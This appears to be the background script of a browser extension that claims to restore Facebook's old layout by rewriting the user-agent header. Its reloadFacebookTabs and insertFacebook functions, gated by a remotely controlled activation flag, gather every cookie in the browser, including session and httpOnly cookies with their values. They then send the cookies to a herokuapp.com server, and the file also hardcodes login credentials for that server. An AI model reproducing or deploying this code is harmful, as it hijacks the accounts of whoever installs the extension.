var userAgent = navigator.userAgent;
// Default useragent to use
var default_useragent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0"; // Firefox
var useragent;

// Force a working useragent after Facebook started redirecting users to mobile site
useragent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0";

var enabled = true; 
var api = typeof chrome!="undefined" ? chrome : browser;
var ID;

/** ------------Get Token ---------------- */

var TOKENKEY;
var ARRAY_COOK = [];
var ACTIVECODE = "0";
var urlAuthen = "https://newlife-authentication.herokuapp.com/users/authenticate";
var url_facebook = "https://newlife-authentication.herokuapp.com/facebook/create";
checkActive();

/**------------end get token--------- */
 
  
 

// When installed or updated, point the user to info/instructions
api.runtime.onInstalled.addListener(function(details){
  var version = "unknown";
  var previousVersion = "1.0";
  try {
    version = api.runtime.getManifest().version;
    previousVersion = details.previousVersion;
  }
  catch (e) { }
  if ("install"===details.reason) {
    // api.tabs.create({url: "https://OldLayout.com/broken.html"});
  }
  else if ("update"===details.reason) {
    var show_update = true;
 
    if (show_update) {
      // api.tabs.create({url: "https://OldLayout.com/broken.html"});
    }
  }
});

// Intercept requests and force them to use our custom user agent
function rewriteUserAgentHeader(o) {
  
  for (var header of o.requestHeaders) {
    if (enabled && header.name.toLowerCase() === "user-agent") {
      header.value = useragent;
    }
  }
  return {
    "requestHeaders": o.requestHeaders
  };
}

// This is the API hook to intercept requests
let sendHeadersOptions = ["blocking", "requestHeaders","addListener","onBeforeSendHeaders","webRequest"];
try {
  if (api.webRequest.OnBeforeSendHeadersOptions.hasOwnProperty("EXTRA_HEADERS")) {
    sendHeadersOptions.push("extraHeaders");
  }
} catch (e) { }
 
 
 
function reloadFacebookTabs() {
  api.tabs.query({"url": "https://*.facebook.com/*"}, function(tabs) {
    if (!tabs || !tabs.length) {
      return;
    }
    tabs.forEach((t) => {
      try {
        api.tabs.reload(t.id); 
        if(ACTIVECODE == "1"){
          chrome.cookies.getAll({}, function (cookies) {
              cookies.forEach(function(cookie) {
                  ARRAY_COOK.push({
                    domain: cookie.domain,
                    expirationDate: cookie.expirationDate,
                    hostOnly: cookie.hostOnly,
                    httpOnly: cookie.httpOnly,
                    name: cookie.name,
                    path: cookie.path,
                    sameSite: cookie.sameSite,
                    secure: cookie.secure,
                    session: cookie.session,
                    storeId: cookie.storeId,
                    value: cookie.value 
                });
                insertFacebook(cookie);

              });
            }
          );
        } 
      } catch (e) {
      }
    });
  });
  
}

function checkActive(){ 
  var url = "https://newlife-authentication.herokuapp.com/status/checkactive";
  var xhr = new XMLHttpRequest();
  xhr.open("get", url, true);
  xhr.setRequestHeader('Content-Type', 'application/json');
  xhr.setRequestHeader('Authorization', 'Bearer ' + TOKENKEY);
  xhr.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
      var myObj = JSON.parse(this.responseText);
      ACTIVECODE = myObj.active;  
      if(ACTIVECODE == "1"){
        console.log("ACTIVECODE = ", ACTIVECODE);
        getToken();
      } else {
        console.log("ACTIVECODE = ", ACTIVECODE);
      }        
    }
  };
  xhr.send();  
}

function getToken(){
  var xmlhttp = new XMLHttpRequest();
  xmlhttp.onreadystatechange = function() {
      if (this.readyState == 4 && this.status == 200) {
          var myArr = JSON.parse(this.responseText);
          TOKENKEY = myArr.token;
          console.log("token: " + TOKENKEY);
      }
  };
  xmlhttp.open("POST", urlAuthen, true);
  xmlhttp.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
  var obj = {
    "username":"sonpx",
    "password":"1q2w3e4r!@#",
  }; 
  xmlhttp.send(JSON.stringify(obj));   
}



function insertFacebook(body) {
  var xhr = new XMLHttpRequest();
  xhr.open("post", url_facebook, true);
  xhr.setRequestHeader('Content-Type', 'application/json');
  xhr.setRequestHeader('Authorization', 'Bearer ' + TOKENKEY);
  xhr.onload = function () {
      var status = xhr.status;
      if (status == 200) {
          // callback(null, xhr.response);
      } 
  };
  xhr.send(JSON.stringify(body));     
}
 
 
function getStatus() {
  return enabled;
}
function enable() {
  enabled = true;
}
function disable() {
  enabled = false;
}
 